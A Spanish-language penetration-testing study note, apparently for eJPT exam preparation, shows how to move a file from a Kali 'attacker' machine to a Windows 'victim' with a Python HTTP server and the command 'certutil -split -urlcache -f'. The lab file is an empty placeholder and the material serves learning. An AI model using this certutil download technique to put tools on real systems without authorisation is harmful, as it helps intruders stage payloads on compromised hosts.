
---
- TAG: #Transferencia #Archivos #Windows #Redes #Certutil
----
# Transferir Archivos con Certutil en Windows

En este apartado, vamos a ver otras opciones de compartir archivos por la red, pero cuando la máquina que reciba sea una máquina **Windows**, porque eso puede cambiar. Vamos a estar viendo una herramienta que se llama **certutil** para poder recibir archivos cuando no tengamos ni **curl** ni **wget** instalados. Esto es algo que ocurre muy frecuentemente en el examen del eJPT.

Vamos a explicarlo de manera más práctica a continuación.

Primero, debemos ir a nuestro virtualizador de máquinas, puede ser **WMware** o **Virtual Box**.

Vamos a tener primero nuestra máquina Windows, donde va a ser la que reciba el archivo que vamos a compartir desde nuestra máquina **Kali Linux** a **Windows**.

Arrancamos ambas máquinas. Recuerden que para este ejercicio debemos tener activada la opción de **adaptador puente** para Virtual Box y la opción _Bridge_ para WMware.

# Máquina Kali Linux

Desde nuestra máquina Linux, compartiremos un archivo mp4 a la máquina Windows utilizando la herramienta **certutil**, ya que es una herramienta que viene instalada por defecto en Windows y nos permite recibir archivos desde otra máquina.

Podemos crear un simple ejemplo de la siguiente manera, utilizando la herramienta `touch`:


```bash
touch example.mp4
```

Para este punto, tenemos que tener en claro nuestra dirección IP de la máquina atacante.

Así que levantamos nuestro **servidor http por el puerto 80** como lo hemos visto en la clase anterior en nuestra máquina Kali Linux:

```bash
python -m http.server 80
```

# Máquina Windows

Abrimos nuestra máquina víctima, donde trataremos de transferirnos los archivos que se encuentren dentro del directorio actual.

Una vez dentro, en el inicio de Windows, presionamos las teclas `Shift + Click Derecho` y abrimos una ventana de comandos.

Dentro del **cmd** ponemos `certutil` y veremos que si la tenemos instalada. Si, por ejemplo, en el examen no les dejan utilizar **curl** y **wget**, esta sería la mejor opción:

```bash
certutil -split -urlcache -f http://1.2.3.4/example.mp4 example.mp4
```

Ahora, ejecutamos el comando y veremos que efectivamente se transferirán los datos a nuestro inicio en la máquina Windows.

Y si revisamos nuestra máquina Kali Linux, veremos que tuvo conexión exitosa `200`.

---

Esto es muy importante aprender ya que en el examen suele haber tanto máquinas Linux como Windows. Si estamos al frente de una máquina Linux, podemos usar tranquilamente el método `curl`, o si nos presentamos hacia una máquina **Windows** con el método `certutil`, en caso de que queramos transferir archivos.